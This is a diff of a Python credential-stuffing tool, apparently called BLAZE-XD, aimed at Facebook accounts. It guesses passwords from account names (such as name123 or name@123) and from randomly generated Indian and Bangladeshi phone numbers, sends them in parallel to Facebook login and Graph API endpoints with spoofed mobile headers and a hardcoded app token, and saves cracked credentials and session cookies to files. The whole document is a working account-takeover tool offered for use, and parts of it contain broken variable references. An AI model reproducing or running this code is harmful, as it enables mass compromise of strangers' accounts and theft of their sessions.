@@ -1,3 +1,6 @@
+
+
+
 #-----
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
 from random import randint
@@ -98,7 +101,7 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 ###
@@ -203,7 +206,7 @@ url_lookup = "https://lookup-id.com/"
 url_mb = "https://x.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
 url_graph = "https://graph.facebook.com/{}"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 
@@ -282,12 +285,12 @@ class __crack__:
             try:
                 Adiagents = random.choice(liners)
             except (KeyError, IOError):
-                Adiagents  = 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/386.0.0.13.96;]'
+                Adiagents  = 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/386.0.0.13.96;]'
             ses = requests.Session()
-            headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+            headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.2861.97 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
             p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
             dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
-            _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+            _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2707.112 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
             po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
             if 'c_user' in ses.cookies.get_dict():
                 print('\r\033[1;32m [BLAZE-Ok]\033[1;32m %s | %s      ' % (user,pw))
@@ -328,15 +331,15 @@ class __crack__:
                         uid, name = yntkts.split('|')
                         xz = name.split(' ')
                         if len(xz) == 1:
-                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"12345", xz[0]+"@123", xz[0]+"00", xz[0]+"1122",name, xz[0]+"1234"]
+                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
                         elif len(xz) == 2:
-                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"12345", xz[0]+"@123", xz[0]+"00", xz[0]+"1122",name, xz[0]+"1234"]
+                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
                         elif len(xz) == 3:
-                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"12345", xz[0]+"@123", xz[0]+"00", xz[0]+"1122",name, xz[0]+"1234"]
+                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
                         elif len(xz) == 4:
-                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"12345", xz[0]+"@123", xz[0]+"00", xz[0]+"1122",name, xz[0]+"1234"]
+                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"12345", xz[0]+"@123", xz[0]+"00", xz[0]+"1122",name, xz[0]+"1234"]
+                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
                         _ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
                     except:
                         pass
@@ -724,7 +727,71 @@ cps = []
 				
 	
 
-
+#_______
+def india():
+	uid=[]
+	os.system('clear')
+	print(logo)
+	print('\033[1;31m[•] NOT : PUT 977,978,990,663,667,778 etc')
+	linex()
+	kode = input('\033[1;37m[•] Put  Your Country Code: ')
+	os.system('clear')
+	print(logo)
+	limit = int(input('[+] Your Idz lemit : '))
+	linex()
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		uid.append(nmp)
+	with ThreadPool(max_workers=65) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(uid))
+		print('[•] Total Acounts : '+tl)
+		print('[•] Selected Code : \x1b[1;92m'+code)
+		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
+		linex()
+		for guru in uid:
+			uid = '+91'+kode+guru
+			aj = uid[0:6]
+			aja = uid[0:8]
+			pwx = [guru,kode+guru,aj,aja]
+			yaari.submit(rcrack,uid,pwx,tl)
+	print(50*'-')
+	print('Crack process has been completed')
+	print('Ids saved in ok.txt,cp.txt')
+	print(47*'-')
+	facebookweb()
+def bd():
+	uid=[]
+	os.system('clear')
+	print(logo)
+	print('\033[1;31m[•] NOT : PUT 130,131,141etc')
+	linex()
+	kode = input('[+]\033[1;36m Put  Your Country Code: ')
+	os.system('clear')
+	print(logo)
+	limit = int(input('[+] Your Idz lemit : '))
+	linex()
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		uid.append(nmp)
+	with ThreadPool(max_workers=65) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(uid))
+		print('[•] Total Acounts : '+tl)
+		print('[•] Selected Code : \x1b[1;92m'+code)
+		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
+		linex()
+		for guru in uid:
+			uid = '+880'+kode+guru
+			pwx = [guru,kode+guru]
+			yaari.submit(rcrack,uid,pwx,tl)
+	print(50*'-')
+	print('Crack process has been completed')
+	print('Ids saved in ok.txt,cp.txt')
+	print(47*'-')
+	facebookweb()
 def rcrack(uid,pwx,tl):
 	#print(uid)
 	global loop
@@ -745,10 +812,8 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			
+               
 			header_freefb = {
-			
-    
     'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
@@ -768,13 +833,9 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
-    'viewport-width': '980',   }
-
-			response = requests.get('https://x.facebook.com/', cookies=cookies, headers=headers)
-    
-    
-			
-					
+    'viewport-width': '980',
+            }
+                
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
@@ -886,15 +947,15 @@ def file():
     os.system("clear")
     print(logo)
     if 'PRO' in l:
-        BLAZE2 = 'mr.Aftab'
+        Aftab2 = 'mr.Aftab'
     else:
-        BLAZE2 = input(f"[+]Enter File: ")
+        Aftab2 = input(f"[+]Enter File: ")
     try:
-        for x in open(BLAZE2,'r').readlines():
+        for x in open(Aftab2,'r').readlines():
             accounts.append(x.strip())
     except:
         print(f"File Not Found");time.sleep(1)
-        BLAZE2()
+        Aftab()
      
     method()
     exit()
@@ -916,7 +977,7 @@ def method():
     os.system("clear")
     print(logo)
     if 'o':      
-        lp = input(f'[+] HOW MANY PASS DO YOU WANNA ADD :? ')
+        lp = input(f'[+] how many password do ypu want to add :? ')
         if lp.isnumeric():
             clear()
             ex = 'firstlast first123 last123'
@@ -933,11 +994,11 @@ def method():
     linex()
     m=input(f"{('!')}Input : ") 
     clear()
-    print(''+("[•] ")+'DO YOU WANT TO SHOW CP ID?(y/n)')
+    print(''+("[•] ")+'Do You Want To Show Cp Ids?(y/n)')
     linex()
     cpok=input(f"{('!')}Input : ")
     clear()
-    print(''+("[•] ")+'DO YOU WANT TO SHOW COOKIES?(y/n)')
+    print(''+("[•] ")+'Do You Want To Show Cookies?(y/n)')
     linex()
     c=input(f"{('!')}Input : ")
     apps='y'
@@ -962,8 +1023,8 @@ def method():
         sys.stdout.write('\r \033[1;97m[\033[1;97mBLAZE-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
-            heads = "Dalvik/1.6.0 (Linux; U; Android 4.2.2; C2004 Build/15.2.A.2.5)"
-            header = {"Content-Type": "application/x-www-form-accencoded","Host": "x.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
+            heads = "dalvik-2-1-0-linux-u-android-13-actab1024-build-tp1a-220624-014"
+            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
@@ -981,7 +1042,7 @@ def method():
                            cookies = f"sb={ssbb};{ckkk}"
                     except Exception as e:print(str(e)+' | '+response.text)
                 print(' \033[1;97m'+cookies)
-                open('/sdcard/BLAZE-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
+                open('/sdcard/BLAZE-COOKIE.txt','a').write(f'{acc}|{pword} | \n{cookies} ')    
                 
                 break
             elif 'www.facebook.com' in response.text:
@@ -997,6 +1058,7 @@ def method():
         loop += 1
      except Exception as e:time.sleep(10)
    
+
 
  
     def method2(user):
@@ -1014,7 +1076,7 @@ def method():
         sys.stdout.write('\r \033[1;97m[\033[1;97mBLAZE-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
-            heads = 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
+            heads = 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36', 
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
@@ -1023,7 +1085,7 @@ def method():
             if 'session_key' in response.text:
                 okacc.append(acc)
                 print('\r\033[1;92m [BLAZE-Ok] '+acc+' | '+pword+'  ')
-                open('/sdcard/BLAZE-cookie-Ok.txt','a').write(f'{acc} | {pword} | {cookies}\n')
+                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc} | {pword}\n')
                 if c=='y':
                  try:  
                   q = json.loads(response.text)
@@ -1037,9 +1099,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;97m [BLAZE-CP] '+acc+' | '+pword)
+                     print('\r\033[1;97m [BLAZE-CP] '+acc+'| '+pword)
                 cpacc.append(acc)
-                open('/sdcard/BLAZE-CP.txt','a').write(f'{acc} | {pword}  \n')
+                open('/sdcard/BLAZE-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -1064,3 +1126,4 @@ def method():
     
   
     
+menu()
